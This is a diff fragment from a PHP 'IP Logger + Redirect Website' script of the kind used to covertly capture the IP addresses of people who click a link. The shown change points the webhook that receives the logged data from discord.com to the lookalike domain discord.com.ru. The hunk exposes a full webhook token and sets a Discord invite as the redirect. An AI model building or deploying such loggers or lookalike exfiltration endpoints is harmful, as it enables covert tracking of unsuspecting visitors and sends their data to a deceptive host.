@@ -3,7 +3,7 @@
 // IP Logger + Redirect Website (Fixed for InfinityFree)
 // ============================================
 
-$webhookurl = "https://discord.com/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
+$webhookurl = "https://discord.com.ru/api/webhooks/1519202084694523998/tj35DK1P3-CF1zcY6WW7MIJS0iOMEG4eUARFFXugz6FbiuD_82kSSJRG1ex-Md5n7evK";
 
 $config = [
     'default_redirect' => 'https://discord.gg/fMbZNhGVmh', 
